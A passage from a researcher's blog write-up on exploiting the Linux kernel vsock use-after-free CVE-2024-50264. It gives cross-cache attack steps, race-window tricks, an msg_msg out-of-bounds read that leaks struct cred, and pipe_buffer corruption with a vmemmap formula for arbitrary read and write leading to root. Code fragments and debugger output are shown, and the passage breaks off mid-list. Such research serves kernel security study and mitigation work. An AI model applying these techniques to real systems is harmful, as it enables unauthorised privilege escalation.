  <li><code>drill_uaf_w_pipe_buffer.c</code>: a UAF exploit that writes into a freed <code>drill_item_t</code>. It performs a cross-cache attack and overwrites <code>pipe_buffer.flags</code> to implement the Dirty Pipe technique and gain LPE. This PoC exploit was also developed during my experiments with CVE-2024-50264.</li>
</ul>

<p>Recent contributions added new variants (kudos to the contributors!):</p>
<ul>
  <li><code>drill_uaf_callback_rop_smep.c</code>: an improved version of <code>drill_uaf_callback.c</code> that adds a ROP chain to bypass SMEP on <code>x86_64</code>.</li>
  <li><code>drill_uaf_w_pte.c</code>: a UAF exploit that writes to a freed <code>drill_item_t</code>. It performs a cross-allocator attack and overwrites a page table entry (PTE) to implement the Dirty Pagetable technique and gain LPE on <code>x86_64</code>.</li>
  <li><code>drill_uaf_w_pud.c</code>: an improved version of <code>__drill_uaf_w_pte.c__</code> that overwrites a page upper directory (PUD) instead of a PTE and implements the Dirty Pagetable attack via huge pages.</li>
</ul>

<p>When I revisited <code>kernel-hack-drill</code> during my CVE-2024-50264 work, this spare-time project hadn&#39;t seen an update in years. But now <code>kernel-hack-drill</code> offers a solid set of resources that Linux kernel security researchers can explore.</p>

<h2 id="experimenting-with-cross-cache-attack-using-kernel-hack-drill">Experimenting with cross-cache attack using kernel-hack-drill</h2>

<p>My first step was to learn how cross-cache attacks behave on the latest Ubuntu kernel with slab allocator hardening turned on.</p>

<p>I implemented a standard cross-cache attack in <code>drill_uaf_w_msg_msg.c</code>. You can see <a href="https://github.com/a13xp0p0v/kernel-hack-drill/blob/e3a105cde99912c89c2c1470a29101eb0d9c2d56/drill_uaf_w_msg_msg.c">the full code in the repository</a>, so I&#39;ll sketch the flow here. For background, I highly recommend <a href="https://xairy.io/about">Andrey Konovalov</a>&#39;s talk <a href="https://www.youtube.com/watch?v=2hYzxsWeNcE">SLUB Internals for Exploit Developers</a>.</p>

<p>To plan the attack, I pulled the needed info from <code>/sys/kernel/slab</code>. The slab caches that hold <code>virtio_vsock_sock</code> (80 bytes) or <code>drill_item_t</code> (95 bytes) each keep 120 slabs in per-CPU partial lists (<code>cpu_partial=120</code>) and 42 objects in each slab (<code>objs_per_slab=42</code>).</p>

<p>The cross-cache attack algorithm:</p>
<ol>
  <li>Allocate <code>objs_per_slab</code> objects to create a fresh active slab. Active slab is the slab that will be used by the kernel for the next allocation.</li>
  <li>Allocate <code>objs_per_slab * cpu_partial</code> objects. This creates the <code>cpu_partial</code> number of full slabs that will later populate the partial list at step 6.</li>
  <li>Create a slab that contains the UAF object. Allocate <code>objs_per_slab</code> objects and keep a dangling reference to the vulnerable object in that slab.</li>
  <li>Create a new active slab again: allocate <code>objs_per_slab</code> objects. This step is <strong>very important</strong> for keeping the cross-cache attack stable. Otherwise, the slab with the vulnerable object remains active and cannot be reclaimed by the page allocator.</li>
  <li>Completely free the slab that holds the UAF object. To do that, free <code>(objs_per_slab * 2 - 1)</code> of the objects allocated just before the last one. The active slab now contains only the last object, and the slab with the UAF object becomes free and moves to the partial list.</li>
  <li>Fill up the partial list: free one of each <code>objs_per_slab</code> objects in the reserved slabs from step 2. That makes the slab allocator clean up the partial list and move the free slab containing the UAF object to the page allocator.</li>
  <li>Reclaim the page that contained the UAF object for another slab cache: spray the target <code>msg_msg</code> objects. As a result, one <code>msg_msg</code> is allocated where the vulnerable object (<code>drill_item_t</code> in my case) used to be.</li>
  <li>Exploit the UAF! Overwrite <code>msg_msg.m_ts</code> to read kernel memory out of bounds.</li>
</ol>

<p>I&#39;ve seen plenty of publications that cover cross-cache attack, but none of them explain how to debug it. I&#39;ll fill that gap.</p>

<p>Let&#39;s examine the <a href="https://github.com/a13xp0p0v/kernel-hack-drill/blob/e3a105cde99912c89c2c1470a29101eb0d9c2d56/drill_uaf_w_msg_msg.c">attack</a> in <code>drill_uaf_w_msg_msg.c</code>. To watch it in action and debug it, make the following tweaks in your kernel sources:</p>
<div><div><pre><code><span>diff --git a/mm/slub.c b/mm/slub.c
index be8b09e09d30..e45f055276d1 100644
</span><span>--- a/mm/slub.c
</span><span>+++ b/mm/slub.c
</span><span>@@ -3180,6 +3180,7 @@</span> static void __put_partials(struct kmem_cache *s, struct slab *partial_slab)
        while (slab_to_discard) {
                slab = slab_to_discard;
                slab_to_discard = slab_to_discard-&gt;next;
<span>+               printk(&#34;__put_partials: cache 0x%lx slab 0x%lx\n&#34;, (unsigned long)s, (unsigned long)slab);
</span> 
                stat(s, DEACTIVATE_EMPTY);
                discard_slab(s, slab);

diff --git a/ipc/msgutil.c b/ipc/msgutil.c
<span>index c7be0c792647..21af92f531d6 100644
</span><span>--- a/ipc/msgutil.c
</span><span>+++ b/ipc/msgutil.c
</span><span>@@ -64,6 +64,7 @@</span> static struct msg_msg *alloc_msg(size_t len)
        msg = kmem_buckets_alloc(msg_buckets, sizeof(*msg) + alen, GFP_KERNEL);
        if (msg == NULL)
                return NULL;
<span>+       printk(&#34;msg_msg 0x%lx\n&#34;, (unsigned long)msg);
</span> 
        msg-&gt;next = NULL;
        msg-&gt;security = NULL;
</code></pre></div></div>

<p>In <code>__put_partials()</code> I print the address of the slab that returns to the page allocator when <code>discard_slab()</code> runs. In <code>alloc_msg()</code> I print the kernel address of each newly allocated <code>msg_msg</code> object.</p>

<p>When the cross-cache attack succeeds, the slab that held <code>drill_item_t</code> objects is handed back to the page allocator and then reused for <code>msg_msg</code> objects. Running the PoC exploit <code>drill_uaf_w_msg_msg</code> makes this visible, as we observe:</p>
<ul>
  <li>In the kernel log:
    <div><div><pre><code>[   32.719582] drill: kmalloc&#39;ed item 5123 (0xffff88800c960660, size 95)
</code></pre></div>    </div>
  </li>
  <li>Then in stdout:
    <div><div><pre><code>[+] done, current_n: 5124 (next for allocating)
[!] obtain dangling reference from use-after-free bug
[+] done, uaf_n: 5123
</code></pre></div>    </div>
  </li>
  <li>Then in GDB (using with <a href="https://github.com/bata24/gef">bata24/gef</a>):
    <div><div><pre><code>gef&gt; slab-contains 0xffff88800c960660
[+] Wait for memory scan
slab: 0xffffea0000325800
kmem_cache: 0xffff888003c45300
base: 0xffff88800c960000
name: kmalloc-rnd-05-96  size: 0x60  num_pages: 0x1
</code></pre></div>    </div>
  </li>
  <li>Finally, in the kernel log:
    <div><div><pre><code>[   36.778165] drill: free item 5123 (0xffff88800c960660)
...
[   36.807956] __put_partials: cache 0xffff888003c45300 slab 0xffffea0000325800
...
[   36.892053] msg_msg 0xffff88800c960660
</code></pre></div>    </div>
  </li>
</ul>

<p>We see the <code>drill_item_t</code> object <code>0xffff88800c960660</code> in slab <code>0xffffea0000325800</code> reallocated as <code>msg_msg</code>, which confirms that the cross-cache attack worked.</p>

<p>After experimenting with <code>kernel-hack-drill</code> on Ubuntu Server 24.04, I found that <code>CONFIG_RANDOM_KMALLOC_CACHES</code> and <code>CONFIG_SLAB_BUCKETS</code> block naive UAF exploitation, yet they also make cross-cache attacks absolutely stable. So, in my humble opinion:</p>

<center><img src="https://a13xp0p0v.github.io/img/slab_hardening.jpg" width="60%"/></center>


<p>It seems that, without a mitigation such as <a href="https://lore.kernel.org/all/20230915105933.495735-15-matteorizzo@google.com/">SLAB_VIRTUAL</a>, the Linux kernel remains wide-open to cross-cache attacks.</p>

<h2 id="adapting-the-cross-cache-attack-to-cve-2024-50264">Adapting the cross-cache attack to CVE-2024-50264</h2>

<p>As noted in the limitations, the vulnerable <code>virtio_vsock_sock</code> client object is allocated together with the server object (<strong>Limitation #1</strong>). That hurts the exploit for two reasons:</p>
<ul>
  <li>On one hand, leaving the server vsock open stops the slab that holds the UAF object from being freed, which kills the cross-cache attack.</li>
  <li>On the other hand, closing the server vsock disturbs the UAF itself.</li>
</ul>

<p>How to deal with it? @v4bel and @qwerty used the <a href="https://github.com/IAIK/SLUBStick">SLUBStick</a> timing side channel to spot when the allocator switched to a new active slab. I went another way:</p>
<blockquote>
  <p>What if I hit the <code>connect()</code> syscall with a signal <strong>almost immediately</strong>?</p>
</blockquote>

<p>In short, I used <strong>one more race condition</strong> to exploit the main race condition – and it worked:</p>
<ul>
  <li>I sent the &#34;immortal&#34; signal 33 to the vulnerable <code>connect()</code> syscall after a 10000 ns timeout, far earlier than the delay needed to trigger the UAF.</li>
  <li>Then I verified the early race condition:
    <ol>
      <li>The <code>connect()</code> syscall must return &#34;Interrupted system call&#34;</li>
      <li>Another testing client vsock should still connect to the server vsock without trouble</li>
    </ol>
  </li>
</ul>

<p>I discovered that when both checks passed, only a single vulnerable <code>virtio_vsock_sock</code> for the client vsock was created. The interrupting signal arrived before the kernel could create the second <code>virtio_vsock_sock</code> for the server vsock. This bypassed <strong>Limitation #1</strong> (paired-object creation). After that, I sent signal 33 again – this time after the normal timeout – to interrupt the vulnerable <code>connect()</code> a second time and provoke the UAF. The cross-cache attack against <code>virtio_vsock_sock</code> was unlocked!</p>

<p>Looping this early race and checking its result was quick. Once the early race succeeded, the main race that triggers the UAF became more stable; I could now hit the UAF about once per second instead of once every several minutes, solving the instability noted in <strong>Limitation #2</strong>. My race condition &#34;speedrun&#34; also eased <strong>Limitation #5</strong>: I managed roughly five UAF writes before the kworker hit a null-ptr-deref at <code>VSOCK_CLOSE_TIMEOUT</code> (8 seconds).</p>

<p>To address <strong>Limitation #4</strong> (the immediate null-ptr-deref in the kworker after UAF), I tried one more race condition, similarly to @v4bel and @qwerty. Right after the UAF-triggering <code>connect()</code>, I called <code>listen()</code> on the vulnerable vsock. If <code>listen()</code> ran before the kworker, it changed the vsock state to <code>TCP_LISTEN</code>, preventing the crash. Unfortunately, this step remains the most unstable part of the whole exploit; the rest is far more stable.</p>

<p>At that point my list of CVE-2024-50264 limitations looked like this:</p>
<ol>
  <li><del>The vulnerable <code>virtio_vsock_sock</code> client object is allocated together with the server object from the same slab cache. That disturbs cross-cache attacks.</del></li>
  <li><del>Reproducing this race condition is very unstable.</del></li>
  <li><strong>The UAF write occurs in a kworker a few microseconds after <code>kfree()</code>, too quickly for typical cross-cache attacks.</strong></li>
  <li><del>A null-ptr-deref in the kworker follows the UAF write. That&#39;s why I shelved the bug at first.</del></li>
  <li><del>Even if that kernel oops is avoided, another null-ptr-deref occurs in the kworker after <code>VSOCK_CLOSE_TIMEOUT</code> (eight seconds).</del></li>
  <li><strong>The kworker hangs in <code>spin_lock_bh()</code> if <code>virtio_vsock_sock.tx_lock</code> is not zero.</strong></li>
</ol>

<p>With the early-signal trick in place, only two limitations were still blocking my exploit.</p>

<h2 id="oh-so-slow-the-cross-cache-attack-shows-up-late-to-the-party">Oh so slow! The cross-cache attack shows up late to the party</h2>

<p>As noted in <strong>Limitation #3</strong>, the UAF write in the kworker fires only a few μs after <code>kfree()</code> for the <code>virtio_vsock_sock</code>. A cross-cache attack needs much more time, so the UAF write lands on the original <code>virtio_vsock_sock</code> and never reaches the <code>msg_msg</code>.</p>

<center><img src="https://a13xp0p0v.github.io/img/uaf_and_cross_cache.jpeg" width="50%"/></center>


<p>I didn&#39;t know how to make cross-cache procedure faster, but I knew how to slow down the attacked kernel code instead. That approach is described in Jann Horn&#39;s article <a href="https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html">Racing against the clock</a>. It allowed to make my kworker slower than a sluggish cross-cache attack.</p>

<p>The main idea is to hammer the kworker with a <code>timerfd</code> watched by a huge pile of <code>epoll</code> instances. Here is the short recipe (see <a href="https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html">Jann&#39;s article</a> for full detail):</p>
<ol>
  <li>Call <code>timerfd_create(CLOCK_MONOTONIC, 0)</code>.</li>
  <li>Create 8 forks.</li>
  <li>In each fork, call <code>dup()</code> for the <code>timerfd</code> 100 times.</li>
  <li>In each fork, call <code>epoll_create()</code> 500 times.</li>
  <li>For every <code>epoll</code> instance, use <code>epoll_ctl()</code> to add all duplicated file descriptors to the interest list – each <code>epoll</code> instance now monitors all available <code>timerfd</code> copies.</li>
  <li>Finally, arm the <code>timerfd</code> so the interrupt hits the kworker at just the right moment:
    <div><div><pre><code><span>timerfd_settime</span><span>(</span><span>timerfd</span><span>,</span> <span>TFD_TIMER_CANCEL_ON_SET</span><span>,</span> <span>&amp;</span><span>retard_tmo</span><span>,</span> <span>NULL</span><span>)</span>
</code></pre></div>    </div>
  </li>
</ol>

<p>This procedure made my race-condition window around 80 times longer.</p>

<p>I wanted some more time to complete the cross-cache attack with a guarantee, but ran into a limit not mentioned in the original write-up. If you exceed the limit in <code>/proc/sys/fs/epoll/max_user_watches</code>, <code>epoll_ctl()</code> fails. From <code>man 7 epoll</code>:</p>
<blockquote>
  <p>This specifies a limit on the total number of file descriptors that a user can register across all epoll instances on the system. The limit is per real user ID. Each registered file descriptor costs roughly 90 bytes on a 32-bit kernel, and roughly 160 bytes on a 64-bit kernel. Currently, the default value for max_user_watches is 1/25 (4%) of the available low memory, divided by the registration cost in bytes.</p>
</blockquote>

<p>On Ubuntu Server 24.04 with 2 GiB of RAM, <code>/proc/sys/fs/epoll/max_user_watches</code> is 431838, which is not huge. I could afford 8 forks × 500 <code>epoll</code> instances × 100 duplicated file descriptors, for a total of 400000 <code>epoll</code> watches.</p>

<p>That was just enough to beat <strong>Limitation #3</strong>, and I finally got <code>msg_msg</code> data size corruption: the vsock UAF changed <code>msg_msg.m_ts</code> from 48 bytes to 8192 (<code>MSGMAX</code>). Now I could do out-of-bounds reading of the kernel memory using the <code>msgrcv()</code> syscall.</p>

<h2 id="sorting-the-loot">Sorting the loot</h2>

<p>The corrupted <code>msg_msg</code> allowed me to read 8 KiB of data from the kernelspace.  I sorted this loot and found a promising infoleak: a kernel address <code>0xffffffff8233cfa0</code> [1]. This infoleak was quite stable and worked with high probability, so I decided to investigate it without doing any additional heap feng shui. GDB showed that it was a pointer to the <code>socket_file_ops()</code> kernel function. I was excited to discover that this function pointer is part of <code>struct file</code>, because the <code>file</code> kernel object also contains the <code>f_cred</code> pointer [2], which leaked as well.</p>

<p>Here&#39;s how I examined the memory leaked by <code>msg_msg</code> at <code>0xffff88800e75d600</code>:</p>
<div><div><pre><code>gef&gt; p *((struct file *)(0xffff88800e75d600 + 96*26 + 64))
$61 = {
  f_count = {
    counter = 0x0
  },
  f_lock = {
    {
      rlock = {
        raw_lock = {
          {
            val = {
              counter = 0x0
            },
            {
              locked = 0x0,
              pending = 0x0
            },
            {
              locked_pending = 0x0,
              tail = 0x0
            }
          }
        }
      }
    }
  },
  f_mode = 0x82e0003,
  f_op = 0xffffffff8233cfa0 &lt;socket_file_ops&gt;,    [1]
  f_mapping = 0xffff88800ee66f60,
  private_data = 0xffff88800ee66d80,
  f_inode = 0xffff88800ee66e00,
  f_flags = 0x2,
  f_iocb_flags = 0x0,
  f_cred = 0xffff888003b7ad00,                    [2]
  f_path = {
    mnt = 0xffff8880039cec20,
    dentry = 0xffff888005b30b40
  },
  ...
</code></pre></div></div>

<p>As a result, my PoC exploit obtained a pointer to <code>struct cred</code>, the structure that stores the current process credentials. The last piece needed for privilege escalation was arbitrary address writing. With that, I could overwrite the exploit process credentials and become root. That would be a data-only attack with no control-flow hijack.</p>

<h2 id="in-search-of-arbitrary-address-writing-primitive">In search of arbitrary address writing primitive</h2>

<p>The most interesting and difficult part of the research began here. I was searching for a target kernel object for my UAF write, which could provide an arbitrary address writing exploit primitive. The search was exhausting. I&#39;ve done the following:</p>
<ul>
  <li>Looked through dozens of kernel objects,</li>
  <li>Read many kernel exploit write-ups,</li>
  <li>Tried <a href="https://kernelctf-dash.storage.googleapis.com/processed/v6.1.111/index.html#!heap/*/msg_msg/64..128">Kernel Exploitation Dashboard</a> by Eduardo Vela and the KernelCTF team.</li>
</ul>

<p>One idea was to combine my limited UAF write with the Dirty Page Table attack (<a href="https://web.archive.org/web/20250226150503/https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">well described</a> by Nicolas Wu). Tweaking page tables can let an attacker read and write data at arbitrary physical address.</p>

<p>I could combine my UAF with a cross-cache attack (or more accurately, cross-allocator attack) to modify page tables. To overwrite kernel text or heap, though, I still needed to know the physical address of the target memory. Two options came to mind:</p>
<ol>
  <li>Bruteforcing physical addresses. Not practical here: I could trigger the UAF only about five times before the kworker crashed, nowhere near enough tries.</li>
  <li>Using the KASLR infoleak from my <code>msg_msg</code> out-of-bounds read. I decided to try that.</li>
</ol>

<p>I ran a quick experiment to see how KASLR behaves on <code>X86_64</code> with <code>CONFIG_RANDOMIZE_BASE</code> and <code>CONFIG_RANDOMIZE_MEMORY</code> enabled. Booting a virtual machine several times, I compared the virtual and physical addresses of kernel <code>_text</code>.</p>

<p>VM run #1:</p>
<div><div><pre><code>gef&gt; ksymaddr-remote
[+] Wait for memory scan
0xffffffff98400000 T _text

gef&gt; v2p 0xffffffff98400000
Virt: 0xffffffff98400000 -&gt; Phys: 0x57400000
</code></pre></div></div>

<p>VM run #2:</p>
<div><div><pre><code>gef&gt; ksymaddr-remote
[+] Wait for memory scan
0xffffffff81800000 T _text

gef&gt; v2p 0xffffffff81800000
Virt: 0xffffffff81800000 -&gt; Phys: 0x18600000
</code></pre></div></div>

<p>Then I calculated the difference between the virtual and physical addresses:</p>
<ul>
  <li>VM run #1: <code>0xffffffff98400000 − 0x57400000 = 0xffffffff41000000</code></li>
  <li>VM run #2: <code>0xffffffff81800000 − 0x18600000 = 0xffffffff69200000</code></li>
</ul>

<p>Because <code>0xffffffff41000000</code> is not equal to <code>0xffffffff69200000</code>, leaking the virtual KASLR offset doesn&#39;t help against physical KASLR.</p>

<center><img src="https://a13xp0p0v.github.io/img/kaslr.jpg" width="60%"/></center>


<p>Thereby to perform Dirty Page Table attack, I needed a way to leak a kernel physical address. Ideally I would do this by mixing some page-allocator feng shui with my out-of-bounds read. That felt messy, and I wanted a cleaner solution.</p>

<p>I kept looking for a target kernel object for my UAF write, which could provide an arbitrary address writing and eventually focused on <code>pipe_buffer</code>.</p>

<p>When a pipe is created with the <code>pipe()</code> system call, the kernel allocates an array of <code>pipe_buffer</code> structures. Each <code>pipe_buffer</code> item in this array corresponds to a memory page that holds data written to the pipe. The diagram below shows the internals of this object:</p>

<center><img src="https://a13xp0p0v.github.io/img/pipe_buffer.png" width="50%"/></center>


<p>This object looked like a good UAF target. I could make a <code>pipe_buffer</code> array the same size as <code>virtio_vsock_sock</code> by changing the capacity of the pipe: <code>fcntl(pipe_fd[1], F_SETPIPE_SZ, PAGE_SIZE * 2)</code>. The kernel changes the array size to <code>2 * sizeof(struct pipe_buffer) = 80 bytes</code>, exactly matching the <code>virtio_vsock_sock</code> size.</p>

<p>In addition, 4 attacker-controlled bytes from the vsock UAF write at offset 24 can flip <code>pipe_buffer.flags</code>, just as in Max Kellermann&#39;s original <a href="https://dirtypipe.cm4all.com/">Dirty Pipe attack</a>.</p>

<center><img src="https://a13xp0p0v.github.io/img/uaf_write_pipe_buffer0.png" width="90%"/></center>


<p>The original Dirty Pipe attack doesn&#39;t even need an infoleak and grants privilege escalation with a one-shot write. Impressed, I decided to experiment with <code>pipe_buffer</code> in my <code>kernel-hack-drill</code>.</p>

<h2 id="experimenting-with-the-dirty-pipe-attack">Experimenting with the Dirty Pipe attack</h2>

<p>First, I built a Dirty Pipe prototype in <code>kernel-hack-drill</code>; the PoC exploit <code>drill_uaf_w_pipe_buffer.c</code> is in the <a href="https://github.com/a13xp0p0v/kernel-hack-drill/blob/e3a105cde99912c89c2c1470a29101eb0d9c2d56/drill_uaf_w_pipe_buffer.c">repository</a>. It:</p>
<ol>
  <li>performs a cross-cache attack and reclaims the slab that held <code>drill_item_t</code> objects as a slab for <code>pipe_buffer</code> objects</li>
  <li>exploits the UAF write to <code>drill_item_t</code>; the attacker-controlled bytes written to <code>drill_item_t</code> at offset 24, modify <code>pipe_buffer.flags</code></li>
  <li>implements the Dirty Pipe attack, achieving LPE in one shot without an infoleak, cool!</li>
</ol>

<p>To use this technique in my CVE-2024-50264 PoC exploit, I still had to bypass the last remaining <strong>Limitation #6</strong>: the kworker hangs before the UAF write if <code>virtio_vsock_sock.tx_lock</code> is non-zero. I managed to solve that by doing <code>splice()</code> from a regular file to the pipe, starting at offset zero:</p>
<div><div><pre><code>	<span>loff_t</span> <span>file_offset</span> <span>=</span> <span>0</span><span>;</span>
	<span>ssize_t</span> <span>bytes</span> <span>=</span> <span>0</span><span>;</span>

	<span>/* N.B. splice modifies the file_offset value */</span>
	<span>bytes</span> <span>=</span> <span>splice</span><span>(</span><span>temp_file_fd</span><span>,</span> <span>&amp;</span><span>file_offset</span><span>,</span> <span>pipe_fd</span><span>[</span><span>1</span><span>],</span> <span>NULL</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>);</span>
	<span>if</span> <span>(</span><span>bytes</span> <span>&lt;</span> <span>0</span><span>)</span>
		<span>err_exit</span><span>(</span><span>&#34;[-] splice&#34;</span><span>);</span>
	<span>if</span> <span>(</span><span>bytes</span> <span>!=</span> <span>1</span><span>)</span>
		<span>err_exit</span><span>(</span><span>&#34;[-] splice short&#34;</span><span>);</span>
</code></pre></div></div>

<p>In that case, the <code>pipe_buffer.offset</code> field remains zero, so the kworker does not hang while acquiring the spinlock:</p>

<center><img src="https://a13xp0p0v.github.io/img/uaf_write_pipe_buffer2.png" width="90%"/></center>


<p>This seemed like a breakthrough – until I noticed that the UAF write also corrupted the <code>pipe_buffer.ops</code> function pointer by four zero bytes of <code>peer_fwd_cnt</code>. That unfortunate side effect provoked kernel crashes on every later operation involving <code>pipe_buffer</code> ☹️:</p>

<center><img src="https://a13xp0p0v.github.io/img/uaf_write_pipe_buffer3.png" width="90%"/></center>


<p>This brought me to the following line of reasoning:</p>
<ol>
  <li>Completing the Dirty Pipe attack requires a working <code>pipe_buffer</code> with an unchanged <code>ops</code> pointer value.</li>
  <li>Preserving <code>0xffffffff</code> in the most significant bytes of the <code>pipe_buffer.ops</code> function pointer requires that same value in <code>peer_fwd_cnt</code>.</li>
  <li>Setting <code>peer_fwd_cnt</code> in <code>virtio_vsock_sock</code> means sending data through the vsock.</li>
  <li>Sending data through a vsock first needs a successful <code>connect()</code>.</li>
  <li>However, a successful <code>connect()</code> on the vulnerable vsock makes the UAF impossible ⛔.</li>
</ol>

<p>Alas!</p>

<h2 id="pipe-buffer-entertainment">Pipe buffer entertainment</h2>

<p>So the original Dirty Pipe technique wouldn&#39;t fit my CVE-2024-50264 PoC exploit. But suddenly an idea struck me:</p>
<blockquote>
  <p>What if I create a pipe with capacity <code>PAGE_SIZE * 4</code> forcing the kernel to allocate four <code>pipe_buffer</code> objects in <code>kmalloc-192</code>?</p>
</blockquote>

<p>In that case, the memory object overlapping looked like this: four <code>pipe_buffer</code> objects in one <code>kmalloc-192</code> slab are allocated at the place of two <code>virtio_vsock_sock</code> objects in two <code>kmalloc-96</code> slabs. The following diagram illustrates the overlap:</p>

<center><img src="https://a13xp0p0v.github.io/img/uaf_write_pipe_buffer7.png" width="90%"/></center>


<p>Here, memory corruption can land on either of the two <code>virtio_vsock_sock</code> objects. I&#39;ll cover these cases one at a time.</p>

<p>To avoid the kernel hang and crash when the UAF hits <code>virtio_vsock_sock</code> <strong>#1</strong>, I used two tricks:</p>
<ol>
  <li>Performed a <code>splice()</code> from a regular file to the pipe with a starting offset of zero. As mentioned earlier, this keeps the <code>offset</code> field of the first <code>pipe_buffer</code> at zero, so the kworker doesn&#39;t hang while acquiring the spinlock.</li>
  <li>Discarded that first <code>pipe_buffer</code> <strong>before triggering the UAF</strong>, leaving its <code>offset</code> field untouched:
    <div><div><pre><code> <span>/* Remove the first pipe_buffer without changing the `pipe_buffer.offset` */</span>
 <span>bytes</span> <span>=</span> <span>splice</span><span>(</span><span>pipe_fd</span><span>[</span><span>0</span><span>],</span> <span>NULL</span><span>,</span> <span>temp_pipe_fd</span><span>[</span><span>1</span><span>],</span> <span>NULL</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>);</span>
 <span>if</span> <span>(</span><span>bytes</span> <span>&lt;</span> <span>0</span><span>)</span>
 	<span>err_exit</span><span>(</span><span>&#34;[-] splice&#34;</span><span>);</span>
 <span>if</span> <span>(</span><span>bytes</span> <span>==</span> <span>0</span><span>)</span>
 	<span>err_exit</span><span>(</span><span>&#34;[-] splice short&#34;</span><span>);</span>

 <span>/*
  * Let&#39;s read this byte and empty the first pipe_buffer.
  * So if the UAF writing corrupts the first pipe_buffer,
  * that will not crash the kernel. Cool!
  */</span>
 <span>bytes</span> <span>=</span> <span>read</span><span>(</span><span>temp_pipe_fd</span><span>[</span><span>0</span><span>],</span> <span>pipe_data_to_read</span><span>,</span> <span>1</span><span>);</span> <span>/* 1 spliced byte */</span>
 <span>if</span> <span>(</span><span>bytes</span> <span>&lt;</span> <span>0</span><span>)</span>
 	<span>err_exit</span><span>(</span><span>&#34;[-] pipe read 1&#34;</span><span>);</span>
 <span>if</span> <span>(</span><span>bytes</span> <span>!=</span> <span>1</span><span>)</span>
 	<span>err_exit</span><span>(</span><span>&#34;[-] pipe read 1 short&#34;</span><span>);</span>
</code></pre></div>    </div>
    <p>After this sequence of <code>splice()</code> and <code>read()</code>, the first <code>pipe_buffer</code> becomes inactive. Even if the subsequent UAF overwrites its <code>ops</code> pointer, later pipe operations won&#39;t dereference that corrupted pointer, so no kernel crash occurs.</p>
  </li>
</ol>

<p>I wanted to exploit the UAF on <code>virtio_vsock_sock</code> <strong>#2</strong> to overwrite the fourth <code>pipe_buffer</code>. To prevent the kernel hang when the UAF hits this second <code>virtio_vsock_sock</code>, I called the same <code>splice(temp_file_fd, &amp;file_offset, pipe_fd[1], NULL, 1, 0)</code> two more times. These syscalls initialized the second and third <code>pipe_buffer</code> objects, leaving their <code>flags</code> at zero, since this pipe operation doesn&#39;t set any <code>PIPE_BUF_FLAG_*</code> bits. Therefore, if the UAF occurs on the second <code>virtio_vsock_sock</code>, the <code>spin_lock_bh()</code> in <code>virtio_transport_space_update()</code> will not hang.</p>

<p>These preparations of the pipe opened a door for corrupting the <code>page</code> pointer of the fourth <code>pipe_buffer</code>:</p>

<center><img src="https://a13xp0p0v.github.io/img/uaf_write_pipe_buffer6.png" width="90%"/></center>


<p><code>kernel-hack-drill</code> let me experiment with <code>pipe_buffer</code> objects. Without it, crafting this exploit primitive for the tricky CVE-2024-50264 would have been extremely hard.</p>

<h2 id="aarw-and-kaslrs-last-revenge">AARW and KASLR&#39;s last revenge</h2>

<p>In a <code>pipe_buffer</code>, the <code>page</code> pointer holds the address of a <code>struct page</code> inside the virtual memory map (<code>vmemmap</code>). <code>vmemmap</code> is an array of these structures that allows the kernel to address physical memory efficiently. It is <a href="https://elixir.bootlin.com/linux/v6.15.5/source/Documentation/arch/x86/x86_64/mm.rst">mentioned</a> in <code>Documentation/arch/x86/x86_64/mm.rst</code>:</p>
<div><div><pre><code>____________________________________________________________|___________________________________________________________
                  |            |                  |         |
 ffff800000000000 | -128    TB | ffff87ffffffffff |    8 TB | ... guard hole, also reserved for hypervisor
 ffff880000000000 | -120    TB | ffff887fffffffff |  0.5 TB | LDT remap for PTI
 ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
 ffffc88000000000 |  -55.5  TB | ffffc8ffffffffff |  0.5 TB | ... unused hole
 ffffc90000000000 |  -55    TB | ffffe8ffffffffff |   32 TB | vmalloc/ioremap space (vmalloc_base)
 ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole
 ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base)
 ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole
 ffffec0000000000 |  -20    TB | fffffbffffffffff |   16 TB | KASAN shadow memory
__________________|____________|__________________|_________|____________________________________________________________
</code></pre></div></div>

<p>Hence, when I managed to perform a UAF write of controlled data to the <code>pipe_buffer.page</code> pointer, I gained arbitrary address reading and writing (AARW) via the pipe. However, I wasn&#39;t able to change the AARW target address many times, as I mentioned in <strong>Limitation #5</strong>, so I had to choose the target in <code>vmemmap</code> carefully.</p>

<p>My first thought was to overwrite part of the kernel code. But with KASLR enabled, I didn&#39;t know the physical address of kernel <code>_text</code> and therefore couldn&#39;t determine its location inside <code>vmemmap</code>.</p>

<p>That&#39;s why I decided to use the pipe AARW against <code>struct cred</code> in the kernel heap. As I described earlier, I leaked the virtual address of <code>cred</code> using my <code>msg_msg</code> out-of-bounds read. This virtual address looked like <code>0xffff888003b7ad00</code>, and I understood it was from the direct mapping of all physical memory. So I used the following formula to calculate the offset of the corresponding <code>struct page</code> in <code>vmemmap</code>:</p>
<div><div><pre><code><span>#define STRUCT_PAGE_SZ 64lu
#define PAGE_ADDR_OFFSET(addr) (((addr &amp; 0x3ffffffflu) &gt;&gt; 12) * STRUCT_PAGE_SZ)
</span><span>uaf_val</span> <span>=</span> <span>PAGE_ADDR_OFFSET</span><span>(</span><span>cred_addr</span><span>);</span>
</code></pre></div></div>

<p>The idea behind it is simple:</p>
<ul>
  <li><code>addr &amp; 0x3ffffffflu</code> gives the offset of the <code>struct cred</code> from the <code>page_offset_base</code>.</li>
  <li>Right shift by 12 gives the number of the memory page containing <code>struct cred</code>.</li>
  <li>Finally, multiplication by 64 (the size of <code>struct page</code>) gives the offset of the corresponding <code>struct page</code> in the <code>vmemmap</code>.</li>
</ul>

<p>This formula should be adapted if the system has more than 4 GiB of RAM. In that case, <code>ZONE_NORMAL</code> containing kernel allocations usually starts at address <code>0x100000000</code>. Hence, to calculate the offset of the needed <code>struct page</code>, we should add <code>(0x100000000 &gt;&gt; 12) * STRUCT_PAGE_SZ</code>.</p>

<p>Excellent, the described formula is independent of KASLR for physical addresses, so I could use it to calculate the four lower bytes of the target address for exploiting the pipe AARW against the <code>struct cred</code>. Why I needed only four lower bytes of <code>pipe_buffer.page</code>:</p>
<ul>
